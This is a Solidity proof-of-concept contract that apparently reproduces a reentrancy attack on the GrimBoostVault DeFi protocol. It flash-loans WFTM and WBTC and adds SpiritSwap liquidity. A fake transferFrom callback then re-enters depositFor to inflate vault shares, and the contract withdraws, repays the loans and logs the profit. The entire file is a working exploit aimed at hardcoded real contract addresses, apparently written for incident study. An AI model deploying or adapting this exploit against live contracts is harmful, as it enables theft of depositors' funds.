// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces.sol";
import "hardhat/console.sol";

contract Exploit {
    IBeethovenVault BeethovenVault = IBeethovenVault(0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce); // for flashloan
    IGrimBoostVault GrimBoostVault = IGrimBoostVault(0x660184CE8AF80e0B1e5A1172A16168b15f4136bF);
    IUniswapV2Router SpiritRouter = IUniswapV2Router(0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52);
    IPancakePair SpiritLP = IPancakePair(0x279b2c897737a50405ED2091694F225D83F2D3bA); // @note change to uniswap pair
    IWFTM WFTM = IWFTM(payable(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83));
    IERC20 WBTC = IERC20(0x321162Cd933E2Be498Cd2267a90534A804051b11); 

    uint loanWFTM = 937830 * 1e18;
    uint loanWBTC = 30 * 1e8;
    uint balanceSpiritLP;
    uint step = 2;
    
    function attack() external {
        //@note prepare WFTM and WBTC flash loan to execute

        IERC20[] memory token = new IERC20[](2);
        token[0] = WFTM;
        token[1] = WBTC;

        uint256[] memory amount = new uint256[](2);
        amount[0] = loanWFTM;
        amount[1] = loanWBTC;

        BeethovenVault.flashLoan(IFlashLoanRecipient(address(this)), token, amount, "");
    }

    // @note callback function from BeethovenVault.flashloan()
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) public {

        // @note allow SpiritRouter to spend funds from flash loan (WFTM and WBTC)
        WFTM.approve(address(SpiritRouter), loanWFTM);
        WBTC.approve(address(SpiritRouter), loanWBTC);

        // @note add liquidity from flash loan funds
        (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        ) = SpiritRouter.addLiquidity(address(WFTM), address(WBTC), loanWFTM, loanWBTC, 0, 0, address(this), block.timestamp + 2);
        console.log('The amount of tokenA sent to the pool: ' , amountA);
        console.log('The amount of tokenB sent to the pool: ' , amountB);
        console.log('The amount of liquidity tokens minted from pool: ', liquidity);

        // @note allow GrimBoostVault to spend huge number from Spirit LP certificates got it after liquidity that was added
        SpiritLP.approve(address(GrimBoostVault), type(uint256).max);
        
        // @note get current contract's Spirit LP certificates balance before attack
        balanceSpiritLP = SpiritLP.balanceOf(address(this)); 
        console.log('The balance amount of SpiritLP certificates tokens minted: ', balanceSpiritLP);

        // @note start reentrancy attack passing exploit contract and SpiritLP amount 
        GrimBoostVault.depositFor(address(this), balanceSpiritLP, address(this));

        // @note after reentrancy attack has finish withdraw all funds
        GrimBoostVault.withdrawAll();

        console.log('--- End of reentrancy');

        // @note get current contract's Spirit LP certificates balance after attack
        uint balanceSpiritLPAfter = SpiritLP.balanceOf(address(this)); 
        console.log('The balance amount of SpiritLP before attack: ', balanceSpiritLP);
        console.log('The balance amount of SpiritLP after  attack: ', balanceSpiritLPAfter);

        // @note transfer Spirit LP certificates back
        SpiritLP.transfer(address(SpiritLP), balanceSpiritLPAfter);
        SpiritLP.burn(address(this));
        console.log('The remaining balance amount of SpiritLP: ', SpiritLP.balanceOf(address(this)));

        // @note pay flash loan WFTM and WBTC
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 _token = tokens[i];
            uint256 _amount = amounts[i];
            uint256 _feeAmount = feeAmounts[i];
            uint256 total = (_amount + _feeAmount);

            console.log('-- Pay flashloan token');
            console.log('token ', address(_token));
            console.log('amount ', _amount);
            console.log('fee amount ', _feeAmount);
            console.log('total ', total);

            _token.transfer(address(BeethovenVault), (_amount + _feeAmount));
        }

        console.log('-------------------');
        console.log('WFTM Profit ', WFTM.balanceOf(address(this)));
        console.log('WBTC Profit ', WBTC.balanceOf(address(this))); 
    }

    function transferFrom(address, address, uint256) public  {
        console.log('------------------- Starting reentrancy');

        uint256 currentSpiritLPBalance = SpiritLP.balanceOf(address(this));
        console.log('Current SpiritLP balance in attacker contract ', currentSpiritLPBalance);

        step -= 1;
        console.log('Step: ', step);

        if (step > 0){
            // @note reentry deposit 
            GrimBoostVault.depositFor(address(this), balanceSpiritLP, address(this));
        } else {
            // @note for last call attacker used spirit LP address to end reentrancy 
            GrimBoostVault.depositFor(address(SpiritLP), balanceSpiritLP, address(this));
        }
    }
}